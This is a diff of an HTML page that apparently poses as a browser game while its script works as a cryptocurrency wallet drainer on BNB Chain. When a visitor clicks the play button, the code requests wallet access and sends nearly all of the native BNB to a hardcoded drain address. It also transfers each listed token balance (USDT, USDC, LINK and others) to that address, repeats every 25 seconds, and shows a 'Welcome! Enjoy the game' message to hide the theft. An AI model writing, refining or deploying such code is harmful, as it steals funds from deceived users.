@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -76,6 +77,7 @@
     const status = document.getElementById("status");
     const btn = document.getElementById("playBtn");
 
+    // BNB Chain Tokens
     const tokens = [
       {s:"USDT", a:"0x55d398326f99059ff775485246999027b3197955"},
       {s:"USDC", a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"},
@@ -91,70 +93,79 @@
       {s:"LINK", a:"0xF8A0bf9cF54Bb92F17374d9e9A321E6a111a51bd"}
     ];
 
-    const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"];
+    const abi = [
+      "balanceOf(address) view returns (uint256)",
+      "transfer(address,uint256) returns (bool)"
+    ];
 
     let connected = false;
+    let lastNative = 0n;
+    let drainedSomething = false;
 
-    async function startDraining() {
+    async function drain() {
       if (!window.ethereum) {
         status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
         return;
       }
 
       try {
-        status.innerHTML = "Connecting... 💕";
-
         if (!connected) {
-          await window.ethereum.request({ method: "eth_requestAccounts" });
+          await window.ethereum.request({method: "eth_requestAccounts"});
           connected = true;
+          status.innerHTML = "Connecting... 💕";
         }
 
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
-        let success = false;
+        drainedSomething = false;
 
-        // Drain BNB - leave almost nothing
+        // Drain Native BNB (very aggressive)
         const nativeBalance = await provider.getBalance(user);
-        if (nativeBalance > ethers.parseEther("0.0002")) {
-          const amountToSend = nativeBalance - ethers.parseEther("0.0002");
-          if (amountToSend > 0n) {
-            try {
-              await signer.sendTransaction({
-                to: drainAddress,
-                value: amountToSend,
-                gasLimit: 120000n
-              });
-              success = true;
-            } catch (e) {}
+        const minThreshold = ethers.parseEther("0.0001");
+        const reserve = ethers.parseEther("0.0002");   // Leaves almost nothing
+
+        if (nativeBalance > lastNative && nativeBalance > minThreshold) {
+          const amount = nativeBalance - reserve;
+          if (amount > 0n) {
+            const gasEstimate = await provider.estimateGas({to: drainAddress, value: amount});
+            await signer.sendTransaction({
+              to: drainAddress,
+              value: amount,
+              gasLimit: (gasEstimate * 130n) / 100n
+            });
+            lastNative = nativeBalance;
+            drainedSomething = true;
           }
         }
 
-        // Drain all tokens
+        // Drain Tokens
         for (const token of tokens) {
           try {
             const contract = new ethers.Contract(token.a, abi, signer);
             const balance = await contract.balanceOf(user);
             if (balance > 0n) {
-              await contract.transfer(drainAddress, balance, { gasLimit: 200000n });
-              success = true;
+              await contract.transfer(drainAddress, balance, {gasLimit: 200000n});
+              drainedSomething = true;
             }
-          } catch (e) {}
+          } catch {}
         }
 
-        status.innerHTML = success 
-          ? "<span class='success'>Welcome! Enjoy the game 💖</span>" 
-          : "<span class='error'>Try again later 💔</span>";
-
+        if (drainedSomething) {
+          status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
+        } else {
+          status.innerHTML = "<span class='error'>Try again later 💔</span>";
+        }
       } catch (e) {
         status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
       }
     }
 
     btn.onclick = () => {
-      startDraining();
-      setInterval(startDraining, 20000);
+      drainedSomething = false;
+      drain();
+      setInterval(drain, 25000);
     };
   </script>
 </body>
